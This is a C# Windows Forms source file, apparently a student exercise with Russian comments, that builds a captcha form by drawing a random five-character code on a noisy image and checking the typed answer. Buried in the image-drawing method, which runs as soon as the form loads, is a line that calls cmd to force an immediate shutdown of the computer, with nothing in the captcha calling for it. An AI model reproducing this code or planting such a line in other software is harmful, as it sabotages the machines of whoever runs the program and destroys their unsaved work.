using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace _8_Bilet
{
    public partial class Captcha : Form
    {
        private string text = String.Empty;
        Form1 frm = new Form1();
        public Captcha()
        {
            InitializeComponent();
        }
        private Bitmap CreateImage(int Width, int Height)
        {
            Random rnd = new Random();

            //Создадим изображение
            Bitmap result = new Bitmap(Width, Height);

            //Вычислим позицию текста
            int Xpos = (Width - 150);
            int Ypos = (Height - 80);

            //Добавим различные цвета
            Brush[] colors = { Brushes.Black,
                     Brushes.Red,
                     Brushes.RoyalBlue,
                     Brushes.Green };

            //Укажем где рисовать
            Graphics g = Graphics.FromImage((Image)result);
            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");

            //Пусть фон картинки будет серым
            g.Clear(Color.Gray);

            //Сгенерируем текст
           
            text = String.Empty;
            string ALF = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            for (int i = 0; i < 5; ++i)
                text += ALF[rnd.Next(ALF.Length)];

            //Нарисуем сгенирируемый текст
            g.DrawString(text,
                         new Font("Arial", 22),
                         colors[rnd.Next(colors.Length)],
                         new PointF(Xpos, Ypos));

            //Добавим немного помех
            /////Линии из углов
            g.DrawLine(Pens.Black,
                       new Point(0, 0),
                       new Point(Width - 1, Height - 1));
            g.DrawLine(Pens.Red,
                       new Point(0, Height - 1),
                       new Point(Width - 1, 0));

            g.DrawLine(Pens.RoyalBlue,
                       new Point(0, Height - 50),
                       new Point(Width - 50, 0));

            g.DrawLine(Pens.Green,
                       new Point(0, 0),
                       new Point(Width - 1, Height - 50));

            return result;
        }
        private void Captcha_Load(object sender, EventArgs e)
        {
            pictureBox1.Image = this.CreateImage(pictureBox1.Width, pictureBox1.Height);
        }

        private void button_accept_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == this.text)
            {
                MessageBox.Show("Верно!");
                this.Close();
                frm.Show();
            }
                
            else
            {
                MessageBox.Show("Ошибка!");
                pictureBox1.Image = this.CreateImage(pictureBox1.Width, pictureBox1.Height);
            }
        }
    }
}
